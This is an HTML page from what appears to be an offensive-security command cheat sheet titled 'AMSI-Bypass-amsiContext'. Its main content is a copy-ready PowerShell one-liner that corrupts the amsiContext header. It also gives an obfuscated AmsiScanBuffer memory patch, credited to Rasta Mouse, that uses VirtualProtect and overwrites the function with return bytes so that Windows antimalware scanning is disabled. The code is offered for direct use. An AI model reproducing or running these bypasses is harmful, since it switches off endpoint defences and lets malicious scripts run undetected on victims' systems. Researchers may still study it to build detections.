<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>
            
            
            amsi bypass amsicontext
            
            |
            
            ARTToolkit
        </title>
        <link rel="icon" href="/assets/logo.png">
        <link id="pagestyle" rel="stylesheet" href="/assets/style.css" type="text/css"/>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
        <script async defer src="https://buttons.github.io/buttons.js"></script>
    </head>
    <body>
        <script type="text/javascript">
            

            document.addEventListener('DOMContentLoaded', function () {
            var checkbox = document.querySelector('input[type="checkbox"]');
            checkbox.addEventListener('change', function () {
                if (checkbox.checked) {
                    document.getElementById('pagestyle').setAttribute('href','/assets/styleDark.css');
                    localStorage["style"] = "true";
                
                } else {
                    document.getElementById('pagestyle').setAttribute('href','/assets/style.css');
                    localStorage["style"] = "false";
                }
            });
            });

        </script>

 
        <a href="https://github.com/arttoolkit/arttoolkit.github.io" class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
        

<h1>
    
    <a href="/">..</a> /
    
    AMSI-Bypass-amsiContext
    <div class="github-buttons">
        <a class="github-button" href="https://github.com/arttoolkit/arttoolkit.github.io" data-icon="octicon-star" data-show-count="true" aria-label="Star arttoolkit/arttoolkit.github.io on GitHub">Star</a>
        <label class="switch">
            <input type="checkbox">
            <span class="slider round"></span>
        </label>
        <script type="text/javascript">        
            if(localStorage["style"]=="true"){
                document.getElementById('pagestyle').setAttribute('href','/assets/styleDark.css');
                document.querySelector('input[type="checkbox"]').checked = true
            }
        </script>
    </div>
</h1>


<ul class="filter-list">
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <li><a href="/wadcoms/AMSI-Bypass-amsiContext/#Bypassing">Bypassing</a></li>
    
    

    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <li><a href="/wadcoms/AMSI-Bypass-amsiContext/#Shell">Shell</a></li>
    
    

    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <li><a href="/wadcoms/AMSI-Bypass-amsiContext/#AV">Antivirus</a></li>
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    

    
    
    
    
    
    
    
    
    <li><a href="/wadcoms/AMSI-Bypass-amsiContext/#Windows">Windows</a></li>
    
    
    
    
    
    
</ul>


<p>One-liner to bypass the AMSI in a Powershell. Done by overwriting the amsiContext header by copying data (four zeros) from managed to unmanaged memory. When the context structure header is overwritten, this should force AmsiOpenSession to error out. The additional code is Rasta Mouse’s memory patch to bypass AMSI, run the one-liner and the additional code to disable AMSI in powershell.</p>

<p>Command Reference:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>loop the GetTypes method, searching for all types containing the string “iUtils” in its name

GetFields accepts filtering modifiers, we’ll apply the NonPublic and Static filters to help narrow the results

loop through all the fields, searching for a name containing “Context”, as this does not be marked as malicious looking for the amsiContext

use Copy to overwrite the amsiContext header by copying data (four zeros) from managed to unmanaged memory
</code></pre></div></div>


Command:
<a href="javascript:void(0)" onClick="copyFunction_com()" style="float: right; margin-bottom: -10px;"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="code_img"/></a>
<ul class="examples">
    <li>
	<pre><code id="code_text">$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like &quot;*iUtils&quot;) {$c=$b}};$d=$c.GetFields(&#39;NonPublic,Static&#39;);Foreach($e in $d) {if ($e.Name -like &quot;*Context&quot;) {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
</code></pre>
    </li>

</ul>


Extra code:
<a href="javascript:void(0)" onClick="copyFunction_com()" style="float: right; margin-bottom: -10px;"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="code_img"/></a>
<ul class="examples">
    <li>
	<pre><code id="code_text">#Rasta-mouses Amsi-Scan-Buffer patch \n
$kizax = @&quot;
using System;
using System.Runtime.InteropServices;
public class kizax {
    [DllImport(&quot;kernel32&quot;)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport(&quot;kernel32&quot;)]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport(&quot;kernel32&quot;)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr yjnqcb, uint flNewProtect, out uint lpflOldProtect);
}
&quot;@

Add-Type $kizax

$rykogwu = [kizax]::LoadLibrary(&quot;$((&#39;àm&#39;+&#39;sî&#39;+&#39;.d&#39;+&#39;ll&#39;).noRMaLiZe([CHAr]([BYte]0x46)+[ChAr]([BYTE]0x6f)+[chAR]([BYTe]0x72)+[Char](109*8/8)+[chaR](68*31/31)) -replace [cHaR](92+76-76)+[cHaR]([byTE]0x70)+[cHar](107+16)+[chAr]([BYtE]0x4d)+[char]([BytE]0x6e)+[cHAr]([byTe]0x7d))&quot;)
$iyslea = [kizax]::GetProcAddress($rykogwu, &quot;$((&#39;ÃmsîScân&#39;+&#39;Buffer&#39;).normaliZe([ChAr]([bYTe]0x46)+[CHaR]([byte]0x6f)+[chAR]([BYTE]0x72)+[cHar]([byte]0x6d)+[chaR]([byTe]0x44)) -replace [char]([bYTe]0x5c)+[char](112*56/56)+[CHAR](123)+[CHAr](75+2)+[char](94+16)+[ChAR]([ByTE]0x7d))&quot;)
$p = 0
[kizax]::VirtualProtect($iyslea, [uint32]5, 0x40, [ref]$p)
$aapt = &quot;0xB8&quot;
$qkwf = &quot;0x57&quot;
$snxi = &quot;0x00&quot;
$wnan = &quot;0x07&quot;
$nchj = &quot;0x80&quot;
$yywa = &quot;0xC3&quot;
$estof = [Byte[]] ($aapt,$qkwf,$snxi,$wnan,+$nchj,+$yywa)
[System.Runtime.InteropServices.Marshal]::Copy($estof, 0, $iyslea, 6)
</code></pre>
    </li>

</ul>


References:
<br>
<br>

<a href="https://gist.github.com/D3Ext/bf57673644ba08e729f65892e0dae6c4">https://gist.github.com/D3Ext/bf57673644ba08e729f65892e0dae6c4</a>
<br>
<br>

<script>

function copyFunction_com() {
	 var copyCommand = document.getElementById("code_text");

	 navigator.clipboard.writeText(copyCommand.innerText.replace(/\n+$/, "")).then(() => {
		 document.getElementById("code_img").alt = "Copied";
		 document.getElementById("code_img").title = "Copied";
	 }, () => {
		 console.log("copy failed");
	 });
}
</script>

        <script>
         // add permalink on headings
         document.querySelectorAll('h2, h3, h4, h5, h5').forEach((heading) => {
             const link = document.createElement('a');
             link.className = 'permalink';
             link.href = `#${heading.id}`;
             heading.appendChild(link);
         });
        </script>
    </body>
</html>
